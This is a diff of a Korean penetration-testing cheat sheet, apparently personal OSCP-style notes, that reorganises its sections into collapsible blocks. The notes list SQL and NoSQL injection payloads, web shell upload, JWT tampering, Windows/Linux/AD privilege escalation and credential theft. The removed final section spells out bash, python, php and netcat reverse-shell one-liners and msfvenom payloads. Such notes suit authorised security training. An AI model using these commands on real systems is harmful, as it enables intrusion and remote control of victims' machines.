@@ -1,8 +1,8 @@
 # 침투 테스트 통합 노트
 
----
+<details>
+  <summary><strong>web</strong></summary>
 
-## web
 - whatweb / curl / burpsuite crawler 활용
 - ⭐ **html code** 및 **JS code** 확인
 - 페이지의 내용 먼저 확인
@@ -13,9 +13,12 @@
 - 페이지 내 숨겨진 input 필드 확인 (`type="hidden"`)
 - 웹 프레임워크/언어 파악 (확장자, 헤더, 에러 메시지)
 
----
+</details>
 
-## sql
+---
+<details>
+  <summary><strong>sql</strong></summary>
+
 - injection / connect / enumeration / update
 - Error-based / Boolean-based / Time-based / Union-based 구분하여 시도
 - `'`, `"`, `)`, `--`, `#`, `/**/` 등 기본 페이로드 먼저
@@ -23,19 +26,25 @@
 - 로그인 폼에서 `' OR 1=1--` 시도
 - Second-order injection 가능성 고려
 - NoSQL injection (MongoDB 등): `{"$gt": ""}` 형태 시도
+  
+</details>
 
 ---
+<details>
+  <summary><strong>ftp</strong></summary>
 
-## ftp
 - upload / download / hidden files
 - Anonymous 로그인 시도 (`anonymous` / 빈 패스워드)
 - `binary` 모드로 파일 전송 (텍스트 모드에서 깨질 수 있음)
 - 업로드 가능한 경우 web shell 업로드 후 웹 경로에서 접근 시도
 - `ls -la`로 숨김 파일 확인
+  
+</details>
 
 ---
+<details>
+  <summary><strong>HTTP</strong></summary>
 
-## http
 - `robots.txt` / `gobuster` / `feroxbuster` / `ffuf` 확인
 - error page 확인
 - cookie에 따라서 redirection 확인
@@ -67,18 +76,17 @@
 - JWT 토큰 확인: `alg: none` 변조, 시크릿 키 브루트포스
 - API 엔드포인트 `/api/v1/`, `/api/v2/` 버전 변경 시도
 - GraphQL: `__schema` introspection 쿼리로 스키마 덤프
-
----
-
-## https
 - TLS 인증서 확인
 - 인증서의 Subject Alternative Name(SAN)에서 서브도메인 수집
 - 구버전 TLS (1.0, 1.1) 또는 취약한 cipher suite 확인 (`testssl.sh`)
 - `sslscan`, `sslyze`로 취약점 확인
 
----
+</details>
 
-## windows
+---
+<details>
+  <summary><strong>windows</strong></summary>
+
 - `powershell history` 확인
 - `whoami` 확인
 - `whoami /priv` — SeImpersonatePrivilege, SeAssignPrimaryTokenPrivilege 등 확인 → Potato 계열 공격
@@ -110,10 +118,13 @@
 - `C:\Windows\Panther\Unattend.xml`, `sysprep.xml` — 자동 설치 파일에 크레덴셜
 - Credential Manager: `cmdkey /list`
 - WinPEAS 실행하여 종합 점검
+  
+</details>
 
 ---
+<details>
+  <summary><strong>linux</strong></summary>
 
-## linux
 - ⭐ **inside files (password leaking, source code, configurations)**
 - `env` / open ports 확인
 - ⭐ **who have permissions (root or user?)**
@@ -161,10 +172,13 @@
 - `wp-config.php`, `.env`, `config.yml` 등 웹 설정 파일에서 DB 크레덴셜
 - Docker 소켓 확인: `/var/run/docker.sock` 쓰기 권한 → 컨테이너 탈출
 - `id` 결과에 `docker`, `lxd`, `disk`, `adm`, `shadow` 그룹 포함 여부 확인
+  
+</details>
 
 ---
+<details>
+  <summary><strong>Active Directory</strong></summary>
 
-## Active Directory
 - Privesc → return 고려
 - `ntpdate`로 먼저 시간을 맞춰주고 시작
 - 유저가 속해 있는 그룹을 잘 살펴보아야 한다
@@ -193,10 +207,13 @@
 - SYSVOL / NETLOGON 공유에서 스크립트, 크레덴셜 확인
 - `C:\Windows\NTDS\ntds.dit` — 도메인 해시 데이터베이스 (Volume Shadow Copy 활용)
 - 도메인 내 DNS 확인: `nslookup`, `dig @<DC IP>`
+  
+</details>
 
 ---
+<details>
+  <summary><strong>SSH</strong></summary>
 
-## SSH
 - `authorized_keys` 변경 여부 확인
 - 접속한 셸에서 명령어가 실행되지 않을 수 있으니 SSH 접속 시도
 - SSH를 새로 생성할 필요 없이 `.ssh` 폴더에서 `authorized_keys`만 생성해도 로그인 가능 *(04.13)*
@@ -208,9 +225,11 @@
 - `-L` 로컬 포트 포워딩 / `-R` 리모트 포트 포워딩 / `-D` SOCKS 프록시
 - `ssh -i id_rsa user@host` 접속 시 `-o StrictHostKeyChecking=no` 옵션
 
----
+</details>
 
-## 도구
+---
+<details>
+  <summary><strong>도구</strong></summary>
 
 ### nmap
 - `-sU --top-ports 100`
@@ -387,6 +406,9 @@
 - `tcpdump -i any port 80 -A` — HTTP 트래픽 텍스트 출력
 - 네트워크 트래픽에서 크레덴셜, 해시 캡쳐
 
+  
+</details>
+
 ---
 
 ## 입력 / 공격 일반
@@ -417,21 +439,3 @@
 - 크레덴셜 재사용 — 획득한 패스워드를 다른 서비스/유저에도 시도
 - 패스워드 변형 시도: `Password1`, `Password123`, `Password!`, `P@ssw0rd`
 - 서비스별 기본 포트 암기: FTP(21), SSH(22), SMTP(25), DNS(53), HTTP(80), SMB(445), MSSQL(1433), MySQL(3306), RDP(3389), WinRM(5985/5986)
-
----
-
-## 리버스 셸 / TTY
-- 리스닝 먼저: `nc -lvnp <port>`
-- bash: `bash -i >& /dev/tcp/<ip>/<port> 0>&1`
-- python3: `python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<ip>",<port>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`
-- php: `php -r '$sock=fsockopen("<ip>",<port>);exec("/bin/sh -i <&3 >&3 2>&3");'`
-- nc (with -e): `nc -e /bin/sh <ip> <port>`
-- nc (without -e): `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ip> <port> >/tmp/f`
-- TTY 업그레이드:
-  1. `python3 -c 'import pty;pty.spawn("/bin/bash")'`
-  2. Ctrl+Z
-  3. `stty raw -echo; fg`
-  4. `export TERM=xterm`
-- `msfvenom -p linux/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f elf -o shell`
-- `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f exe -o shell.exe`
-- `msfconsole`의 `use exploit/multi/handler`로 리스닝
